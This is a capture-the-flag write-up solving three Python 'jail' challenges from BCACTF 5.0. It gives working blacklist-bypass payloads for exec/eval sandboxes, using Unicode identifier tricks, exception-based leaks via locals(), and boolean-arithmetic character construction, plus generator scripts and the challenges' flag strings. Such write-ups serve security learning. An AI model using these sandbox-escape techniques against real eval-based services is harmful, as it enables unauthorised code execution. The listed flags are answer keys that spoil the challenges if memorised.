# BCACTF 5.0

## JailBreak 1/JailBreak 2/JailBreak Revenge

> (#1)
> I cannot get the python file to print the flag, are you able to?
>
> (#2)
> The prison has increased security measures since you last escaped it. Can you still manage to escape?
> 
> (Revenge)
> Some of y'all cheesed the previous two jailbreaks, so it looks like they've put even more band-aids on the system...
> 
> Author: Jack
> 
> [`deploy.py`](deploy.py), [`main.py`](main.py), [`main_revenge.py`](main_revenge.py)

Tags: _misc_

## Solution
*JailBreak*  was a sequence of two python jail challenges. For *JailBreak 1* [`deploy.py`](deploy.py) was delivered and for *JailBreak 2* [`main.py`](main.py) respectively. The code is faily small, there is a blacklist of `banned characters`.

```python
def sanitize(letter):
    print("Checking for contraband...")
    return any([i in letter.lower() for i in BANNED_CHARS])

BANNED_CHARS = "gdvxftundmnt'~`@#$%^&*-/.{}"
flag = open('flag.txt').read().strip()

print("Welcome to the prison's mail center")
msg = input("Please enter your message: ")

if sanitize(msg): 
    print("Contraband letters found!\nMessage Deleted!")
    exit()

exec(msg)
```

I solved both challenges with the same approach, since unicode characters are not forbidden a feature of Python can be used: the interpreter allows names in code to contain a subset of unicode characters and reduces them to the corresponding characters in `Basic Latin`. We can convert our code like this and putting `𝘱𝘳𝘪𝘯𝘵(𝘧𝘭𝘢𝘨)` to the challenge gives us the flag.

```python
def to_unicode(s):
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    return ''.join([chr(alphabet.index(c) + 0x1D608) if c in alphabet else c for c in s])
```

# Intended Solution JailBreak 1

Actually, this was not the intended solution. And a `revenge challenge` was published that blacklisted the unicode approach. So, to see where we are we check which characters are allowed.

```python
BANNED_CHARS = "gdvxftundmnt'~`@#$%^&*-/.{}"

allowed_chars = ""
for c in range(32, 128):
    if chr(c) not in BANNED_CHARS:
        allowed_chars += chr(c)

print(allowed_chars)
```

There are quite some characters allowed , thats good. 

```bash
 !"()+,0123456789:;<=>?ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]_abcehijklopqrswyz|
 ```

 Lets see which [`built-in functions`](https://docs.python.org/3/library/functions.html) are available (remember `__builtin__` is set to an empty dictionary, but these functions are always available).

 ```python
 import keyword, builtins, inspect

BANNED_CHARS = "gdvxftundmnt'~`@#$%^&*-/.{}"

allowed_chars = ""
allowed_keywords = []
allowed_builtins = []

def is_valid(value):
    global allowed_chars
    return all([True if c in allowed_chars else False for c in value])

for c in range(32, 127):
    if chr(c) not in BANNED_CHARS:
        allowed_chars += chr(c)

builtins_ = [name for name, obj in inspect.getmembers(builtins)]
for builtin in builtins_:
    if is_valid(builtin):
        allowed_builtins.append(builtin)

for kw in keyword.kwlist:
    if is_valid(kw):
        allowed_keywords.append(kw)

print(allowed_chars)
print(", ".join(allowed_keywords))
print(", ".join(allowed_builtins))
 ```

 The functions we can use are:

 ```bash
  !"()+,0123456789:;<=>?ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]_abcehijklopqrswyz|
False, as, break, class, else, is, or, pass, raise, while
EOFError, Ellipsis, False, IOError, KeyError, OSError, TabError, TypeError, __spec__, abs, all, ascii, bool, callable, chr, hash, help, locals, pow, repr, slice, zip
 ```

Great, locals is avaiable, that gives us the `current local symbol table`, which also contains `flag`. But we don't have access to print. But we can use the keyword `raise` to raise an exception that leaks values for us. Our payload would be `raise IOError(flag)`, but sadly `f` and `g` are blocked. Since we have access to `chr` we can bypass this with `raise IOError(locals()[chr(102)+"la"+chr(103)])`

# Intended Solution JailBreak 2

Now for the second one. Lets run our script with the forbidden characters.

```bash
 !"()*+,-:;<=>?ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_abchjklopqrswz|
as, class, or, pass
EOFError, IOError, OSError, TabError, abs, all, bool, chr, hash, locals, pow
```

This time no `raise`, also no numbers to specify characters. But our input is passed to `eval` which means we only have to get the string `flag` together.

To get numbers we can use boolean logic, where `True` is cast to `1`. So we can add boolean expressions together. One thing that works is `[[]]>[]` which resolves to `True`. Since we have `+, -, <<` we can stitch together the number of expressions to end at the character code we are looking for. I wrote a small script that does this.

```python
import math

one = "([[]]>[])"

def next_power_of_two(n):
    n = n - 1
    while n & n - 1:
        n = n & n - 1
    return n << 1

def _num(value):
    return f"({'+'.join([one]*value)})"

def _pow(exp):
    return f"{one}<<{_num(exp)}"

def _chr(c):
    p = math.frexp(next_power_of_two(ord(c)))[1]-1
    return f"({_pow(p)})-({_num((1<<p)-ord(c))})"

payload = ""
for c in "flag":
    payload += f"chr({_chr(c)})+"

print(payload[:-1])
```

The final payload looks like this. Putting it as input gives us the flag.

```python
locals()[chr((([[]]>[])<<(([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])))-((([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[]))))+chr((([[]]>[])<<(([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])))-((([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[]))))+chr((([[]]>[])<<(([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])))-((([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[]))))+chr((([[]]>[])<<(([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])))-((([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[])+([[]]>[]))))]
```

# Bonus JailBreak Revenge

JailBreak Revenge filters even more characters.

```bash
()+<>ABCDEFGHIJKLMNOPQRSTUVWXYZ[]achjloqrswz
as, class, or
EOFError, IOError, OSError, all, chr, hash, locals
```

We don't have `-` anymore, so we can adapt the script from above to only use `+`.

```python
def _chr(c):
    p = math.frexp(next_power_of_two(ord(c))>>1)[1]-1
    return f"({_pow(p)})+({_num((ord(c)-(1<<p)))})"
```

The rest stays the same as for JailBreak 2, leading us to the flag.

Flag `bcactf{PyTH0n_pR0_03ed78292b89c}`, `bcactf{PyTH0n_M4st3R_Pr0veD}`, `bcactf{Wr1tING_pyJaiL5_iS_hArD_f56450aadefcc}`